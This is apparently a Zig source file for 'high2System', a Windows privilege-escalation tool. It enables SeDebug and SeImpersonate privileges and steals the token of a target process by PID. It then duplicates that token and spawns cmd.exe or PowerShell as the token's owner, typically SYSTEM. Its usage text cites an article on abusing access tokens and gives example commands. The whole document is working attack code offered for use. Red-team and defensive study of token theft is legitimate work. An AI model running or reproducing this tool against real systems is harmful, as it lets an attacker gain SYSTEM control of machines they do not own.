// set log level by build type
pub const default_level: std.Level = switch (std.builtin.mode) {
    .Debug => .debug,
    .ReleaseSafe, .ReleaseFast, .ReleaseSmall => .info,
};

const std = @import("std");
const win32 = @import("win32").everything;
const win32_security = @import("win32").security;
const W = std.unicode.utf8ToUtf16LeStringLiteral;

const windows = std.os.windows;
const INFO_BUFFER_SIZE: u32 = 32767;

// https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170

const Action = struct {
    const Self = @This();

    command: []u8,
    targetPID: u32,
    targetDuplicateProcessToken: ?win32.HANDLE,
    targetProcessToken: ?win32.HANDLE,
    allocator: std.mem.Allocator,
    io: std.Io,

    pub fn init(allocator: std.mem.Allocator, io: std.Io) !Self {
        return Self{
            .command = "",
            .targetPID = 0,
            .targetDuplicateProcessToken = undefined,
            .targetProcessToken = undefined,
            .allocator = allocator,
            .io = io,
        };
    }

    pub fn tryEnablePrivilege(
        se_privilege: ?[*:0]const u8,
    ) bool {
        var tp: win32.TOKEN_PRIVILEGES = undefined;
        var luid: win32.LUID = undefined;

        // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea
        if (0 == win32.LookupPrivilegeValueA(
            null, //                    [in, optional] LPCSTR lpSystemName,
            se_privilege, //     [in]           LPCSTR lpName,
            &luid, //                   [out]          PLUID  lpLuid
        )) {
            std.log.err("[!] Failed LookupPrivilegeValueA :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return false;
        }

        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = win32.SE_PRIVILEGE_ENABLED;

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
        const hProcess: ?win32.HANDLE = win32.GetCurrentProcess();
        var processToken: ?win32.HANDLE = null;
        defer _ = Action.CloseHandle(hProcess);

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
        if (0 == win32.OpenProcessToken(
            hProcess.?, //                               [in]  HANDLE  ProcessHandle,
            win32_security.TOKEN_ADJUST_PRIVILEGES, //   [in]  DWORD   DesiredAccess,
            &processToken, //                 [out] PHANDLE TokenHandle
        )) {
            std.log.err("[!] Failed OpenProcessToken :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return false;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
        if (0 == win32.AdjustTokenPrivileges(
            processToken, //         [in]            HANDLE            TokenHandle,
            win32.FALSE, //                   [in]            BOOL              DisableAllPrivileges,
            &tp, //                             [in, optional]  PTOKEN_PRIVILEGES NewState,
            @sizeOf(win32.TOKEN_PRIVILEGES), // [in]            DWORD             BufferLength,
            null, //                            [out, optional] PTOKEN_PRIVILEGES PreviousState,
            null, //                            [out, optional] PDWORD            ReturnLength
        )) {
            const result = @intFromEnum(win32.GetLastError());
            if (result == @intFromEnum(win32.WIN32_ERROR.ERROR_INVALID_HANDLE)) {
                std.log.err("[!] Failed AdjustTokenPrivileges - invalid handle :: error code ({d})", .{result});
            } else {
                std.log.err("[!] Failed AdjustTokenPrivileges:: error code ({d})", .{result});
            }

            return false;
        }

        const result = @intFromEnum(win32.GetLastError());
        if (result != 0) { // win32.WIN32_ERROR.ERROR_SUCCESS

            if (result == 1300) { // win32.WIN32_ERROR.ERROR_NOT_ALL_ASSIGNED
                std.log.err("[!] Failed to assign privilege :: error code ({d})", .{result});
            } else {
                std.log.err("[!] Failed to enable SeDebugPrivilege :: error code ({d})", .{result});
            }

            return false;
        }

        return true;
    }

    pub fn execute(self: *Self) !void {
        var infoBuf: [INFO_BUFFER_SIZE]u8 = std.mem.zeroes([INFO_BUFFER_SIZE]u8);
        var bufCharCount: u32 = INFO_BUFFER_SIZE;

        var startupInfo: win32.STARTUPINFOW = std.mem.zeroes(win32.STARTUPINFOW);
        var processInformation: win32.PROCESS_INFORMATION = std.mem.zeroes(win32.PROCESS_INFORMATION);

        startupInfo.cb = @sizeOf(win32.STARTUPINFOW);
        const lpDesktop = W("WinSta0\\Default");
        startupInfo.lpDesktop = @ptrCast(@constCast(lpDesktop));

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        const processHandle: ?win32.HANDLE = win32.OpenProcess(
            win32.PROCESS_QUERY_INFORMATION,
            win32.TRUE,
            self.targetPID,
        );
        if (processHandle == null) {
            std.log.err("[!] Failed OpenProcess :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return error.OpenProcessFailed;
        }

        defer _ = Action.CloseHandle(processHandle);

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
        if (0 == win32.OpenProcessToken(
            processHandle,
            win32_security.TOKEN_ACCESS_MASK{
                .DUPLICATE = 1,
                .QUERY = 1,
                .IMPERSONATE = 1,
                .ASSIGN_PRIMARY = 1,
            },
            &self.targetProcessToken,
        )) {
            std.log.err("[!] Failed OpenProcessToken :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return error.OpenProcessTokenFailed;
        }
        defer _ = Action.CloseHandle(processHandle);

        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser
        if (0 == win32.ImpersonateLoggedOnUser(
            self.targetProcessToken,
        )) {
            std.log.err("[!] Failed ImpersonateLoggedOnUser :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return error.ImpersonateLoggedOnUserFailed;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea
        if (0 == win32.GetUserNameA(@ptrCast(&infoBuf), &bufCharCount)) {
            std.log.err("[!] Failed GetUserNameA :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return error.GetUserNameAFailed;
        }

        std.log.debug("[+] Impersonated: {s}", .{infoBuf[0..bufCharCount]});

        var lpAttributes: win32.SECURITY_ATTRIBUTES = std.mem.zeroes(win32.SECURITY_ATTRIBUTES);
        lpAttributes.nLength = @sizeOf(win32.SECURITY_ATTRIBUTES);
        lpAttributes.bInheritHandle = win32.TRUE;

        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
        if (0 == win32.DuplicateTokenEx(
            self.targetProcessToken,
            win32_security.TOKEN_ACCESS_MASK{
                .ASSIGN_PRIMARY = 1, // 0x0001 - documented requirement
                .DUPLICATE = 1, // 0x0002 - documented requirement
                .QUERY = 1, // 0x0008 - documented requirement
                .ADJUST_DEFAULT = 1, // 0x0080 - needed internally for NtSetInformationToken
                .ADJUST_SESSIONID = 1, // 0x0100 - needed internally for session assignment
            },
            &lpAttributes,
            win32.SecurityImpersonation,
            win32.TokenPrimary,
            &self.targetDuplicateProcessToken,
        )) {
            std.log.err("[!] Failed DuplicateTokenEx :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
            return error.DuplicateTokenExCallFailed;
        }

        const lpApplicationName = try std.unicode.utf8ToUtf16LeAllocZ(self.allocator, self.command);
        errdefer self.allocator.free(lpApplicationName);

        std.log.info("[+] Calling CreateProcessWithTokenW with lpApplicationName {s}", .{self.command});

        // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw
        if (0 == win32.CreateProcessWithTokenW(
            self.targetDuplicateProcessToken,
            win32.LOGON_WITH_PROFILE,
            lpApplicationName,
            null,
            @bitCast(win32.CREATE_NEW_CONSOLE),
            null,
            null,
            &startupInfo,
            &processInformation,
        )) {
            std.log.err("[!] Failed CreateProcessWithTokenWFailure :: {s} error code ({d})", .{ self.command, @intFromEnum(win32.GetLastError()) });
            return error.CreateProcessWithTokenWCallFailed;
        }

        defer _ = Action.CloseHandle(processInformation.hProcess);
        defer _ = Action.CloseHandle(processInformation.hThread);

        _ = win32.RevertToSelf();
    }

    pub fn debug(self: *Self) void {
        std.log.debug(
            "\nTarget PID:\t{d}\nCommand:\t{s}\n",
            .{ self.targetPID, self.command },
        );
    }

    pub fn parsePID(self: *Self, line: [:0]const u8) !void {
        self.targetPID = try std.fmt.parseInt(u32, line, 10);
    }

    pub fn parseCommand(self: *Self, line: [:0]const u8) !void {
        self.command = try std.fmt.allocPrint(self.allocator, "{s}", .{line});
    }

    pub fn deinit(self: *Self) void {
        self.allocator.free(self.command);

        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself
        _ = win32.RevertToSelf();

        Action.CloseHandle(self.targetDuplicateProcessToken);
        Action.CloseHandle(self.targetProcessToken);
    }

    pub fn CloseHandle(handle: ?win32.HANDLE) void {
        if (handle != null and handle.? != win32.INVALID_HANDLE_VALUE) {
            // https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
            _ = win32.CloseHandle(handle.?);
        }
    }
};

pub fn usage(
    allocator: std.mem.Allocator,
    io: std.Io,
    argv: [:0]const u8,
) !void {
    const buffer: []u8 = try std.fmt.allocPrint(
        allocator,
        \\high2System
        \\
        \\  This tool exist thanks to https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962
        \\
        \\Requirements:
        \\  * SE_IMPERSONATE_NAME - "The process that calls CreateProcessWithTokenW must have this privilege."
        \\  * SE_DEBUG_PRIVILEGE
        \\
        \\Usage:
        \\   <PID> <lpApplicationName>
        \\
        \\Example:
        \\ .\\{s} 123 C:\windows\system32\cmd.exe
        \\ .\\{s} 123 C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe
        \\\
    ,
        .{ argv, argv },
    );

    try std.Io.File.stdout().writeStreamingAll(io, buffer);

    std.process.exit(0);
}

pub fn main(init: std.process.Init) !void {
    var gpa = std.heap.DebugAllocator(.{}){};
    const allocator = gpa.allocator();
    defer _ = gpa.deinit();

    const args = try init.minimal.args.toSlice(init.arena.allocator());

    if (args.len < 2) {
        try usage(allocator, init.io, args[0]);
    }

    var action = try Action.init(
        allocator,
        init.io,
    );
    defer action.deinit();

    var i: u8 = 0;

    for (args) |arg| {
        if (i == 1) {
            try action.parsePID(arg);
        }

        if (i == 2) {
            try action.parseCommand(arg);
        }

        i += 1;
    }

    if (action.command.len <= 0) {
        action.command = try std.fmt.allocPrint(action.allocator, "{s}", .{"C:\\windows\\system32\\cmd.exe"});
    }

    const file = std.Io.Dir.openFileAbsolute(
        init.io,
        action.command,
        .{},
    ) catch {
        std.log.err("[!] Failed to open {s}\n", .{action.command});
        return;
    };
    file.close(init.io);

    action.debug();

    if (!Action.tryEnablePrivilege(win32.SE_DEBUG_NAME)) {
        std.log.err("[!] User does not possess Privilege: SeDebug", .{});
        return;
    }

    if (!Action.tryEnablePrivilege(win32.SE_IMPERSONATE_NAME)) {
        std.log.err("[!] User does not possess Privilege: SeImpersonateName", .{});
        return;
    }

    std.log.info("[+] Privileges Verified and Enabled", .{});

    action.execute() catch {
        std.log.err("[!] Failed to execute {s}", .{action.command});
        return;
    };

    std.log.info("[+] Executed {s}", .{action.command});

    std.process.exit(0);
}
